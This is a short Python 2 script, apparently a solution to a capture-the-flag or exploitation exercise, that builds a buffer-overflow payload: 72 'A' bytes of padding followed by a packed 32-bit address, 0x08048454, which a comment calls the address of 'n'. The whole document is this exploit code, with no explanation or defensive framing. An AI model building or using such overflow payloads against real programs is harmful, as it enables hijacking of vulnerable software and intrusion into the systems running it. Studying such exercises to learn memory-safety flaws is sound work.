import struct;
# address of n
target = struct.pack('I', 0x08048454)
print 'A' * 72 + target
